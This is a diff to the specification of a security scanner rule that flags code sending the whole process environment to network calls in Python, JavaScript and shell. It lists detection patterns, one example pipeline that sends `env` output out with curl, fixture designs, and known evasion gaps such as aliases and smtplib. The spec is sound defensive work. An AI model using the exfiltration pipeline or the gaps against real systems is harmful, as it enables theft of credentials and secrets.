@@ -104,13 +104,49 @@ Any of these triggers FAIL regardless of score:
 ## Critical patterns (implement these exactly)
 
 ### NET-EXFIL-ENV (Critical)
-Python — Semgrep-shaped pattern, but for the regex pass in TS:
-```
-requests\.(post|put|patch|get|request)\s*\([^)]*\b(os\.environ|process\.env)\b
-fetch\s*\([^)]*\{[^}]*body\s*:\s*JSON\.stringify\s*\(\s*process\.env\s*\)
-httpx\.(post|put|patch|get|request)\s*\([^)]*\bos\.environ\b
-```
-Plus shell. An environment dump is `env`, `printenv`, `export`, `export -p`,
+Python: a read of the whole environment whose value reaches a network call in
+the same file. The finding is on the line of the read.
+- A whole-environment read uses `os.environ` as a whole: `dict(os.environ)`,
+  `os.environ.copy()`, `.items()`, `.keys()`, `.values()`, `{**os.environ}`,
+  `json.dumps(os.environ)`, or `for name in os.environ`. After
+  `from os import environ`, `environ` counts too. A key lookup
+  (`os.environ["API_KEY"]`, `.get()`, `.pop()`, `.setdefault()`), a write, and
+  a membership test (`"CI" in os.environ`) are not whole reads.
+- A network call is `urlopen`, `requests.<verb>`, `httpx.<verb>`,
+  `aiohttp.request`, a client constructor (`requests.Session`, `httpx.Client`,
+  `httpx.AsyncClient`, `aiohttp.ClientSession`, `http.client.HTTPConnection`,
+  `http.client.HTTPSConnection`, `socket.socket`, `socket.create_connection`),
+  or a send method of a client name: an HTTP verb, `request`, `putrequest`,
+  `putheader`, `endheaders`, `send`, `sendall`, `sendto`, `sendmsg`,
+  `connect`, or `ws_connect`. The arguments `timeout`, `verify`,
+  `allow_redirects`, `follow_redirects`, `cert`, and `context` are not data.
+- The value flows through an assignment, a loop target, a container update
+  (`append`, `extend`, `insert`, `update`, `add`, `setdefault`), a return value
+  (also read as `self.<method>()`), and an argument of a function in the file.
+  A keyword argument goes to the parameter of that name, and a positional
+  argument goes by position. A name that a function binds is local to that
+  function. `self.<name>` is shared by all methods. A key lookup on a variable
+  that holds the environment, or on a call result, reads one item.
+- Strings and comments do not count. The fields of an f-string do.
+- The `env=` argument of `subprocess.run`, `subprocess.Popen`,
+  `subprocess.call`, `subprocess.check_call`, `subprocess.check_output`,
+  `asyncio.create_subprocess_exec`, and `asyncio.create_subprocess_shell` sets
+  the environment of the child process. It does not flow into the call result.
+- A filtered copy, such as
+  `{k: v for k, v in os.environ.items() if k.startswith("APP_")}`, still
+  counts. The rule cannot tell which names the filter keeps.
+- The check also reads Python inside the other file types of the rule, such as
+  a shell heredoc.
+- Known gaps: aliases (`import os as o`, `from requests import post`), a
+  nested function that reads a local of its parent, Python that runs `env` in
+  a shell, and other send paths such as `smtplib` and
+  `asyncio.open_connection`.
+
+JavaScript and TypeScript: `JSON.stringify(process.env)`. Other
+serializations of `process.env` into `fetch` or `http.request`, such as
+`{...process.env}` or `Object.entries(process.env)`, are a known gap.
+
+Shell: an environment dump is `env`, `printenv`, `export`, `export -p`,
 `declare -p`, `declare -x`, or `set` with no arguments, optionally called by
 its `/bin/` or `/usr/bin/` path. `printenv PATH` prints one value and does not
 match.
@@ -136,9 +172,14 @@ curl or wget command do not match. A printed string with an unescaped command
 substitution (`echo "$(env | curl -d @- URL)"`) still runs, so it matches. An
 escaped one (`\$(env)`) prints as text and does not match.
 
-Malicious fixture shape: a `.py` file that sends `os.environ` to an IP.
-Benign fixture: reads a single env var and uses it locally, posts a static
-JSON body to an ordinary API, and prints an example pipeline.
+Malicious fixtures: `.py` files that send the whole environment with each
+listed client, directly and through variables, a return value, a method
+attribute, and a function argument, and a shell script that sends `$(env)`.
+Benign fixtures: a script that authenticates with one named variable, gives a
+copy of the environment to a child process, sends a membership flag, uses one
+local name for the copy in one function and for a report in another, prints the
+environment locally, and quotes the attack in a docstring; a script that posts
+a static JSON body; and a shell script that prints an example pipeline.
 
 ### NET-WEBHOOK-KNOWN (Critical)
 URLs in code and markdown that deliver data to a chat webhook, a request
